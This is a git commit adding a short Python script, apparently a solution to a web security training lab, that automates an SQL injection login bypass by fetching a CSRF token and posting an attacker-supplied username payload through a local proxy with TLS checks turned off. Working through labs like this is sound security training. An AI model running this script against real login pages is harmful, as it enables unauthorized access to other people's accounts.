3cad3f16c99d672da74ca41ca0e331dff36495ae
luisfernandomendozav <109832400+luisfernandomendozav@users.noreply.github.com>
2023-06-27 11:04:23 -0700

    [lab-02] SQL injection vulnerability allowing login bypass (#2)
    Co-authored-by: Luis Fernando Mendoza <luisfernandomendoza@Luiss-MacBook-Pro.local>

---
+++ lab-02/sqli-lab-02.py
@@ -0,0 +1,45 @@
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http' :'http://127.0.0.1:8080','https' :'http://127.0.0.1:8080'}
+
+def get_csrf_token(s, url):
+    r = s.get(url, verify=False, proxies=proxies)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    csrf = soup.find("input")['value']
+    return csrf
+
+def exploit_sqli(s, url, payload):
+    csrf = get_csrf_token(s, url)
+    data = {
+        "csrf": csrf,
+        "username": payload,
+        "password": "randomtext"
+        }
+    r = s.post(url, data=data, verify=False, proxies=proxies)
+    res = r.text 
+    if "Log out" in res:
+        return True
+    else:
+        return  False
+    # does nothing
+
+
+if __name__ == '__main__':
+    try:
+        url = sys.argv[1].strip()
+        payload = sys.argv[2].strip()
+    except IndexError:
+        print("[ - ] Usage: %s <url> <payload>" % sys.argv[0])
+        print('[ - ] Example: %s www.example.com "1=1"' % sys.argv[0])
+        sys.exit(-1)
+
+    s = requests.Session()
+
+    if exploit_sqli(s, url, payload):
+        print("[ + ] SQL Injection successful! We have logged in as the administrator user.")
+    else:
+        print("[ - ] SQL Injection failed)")
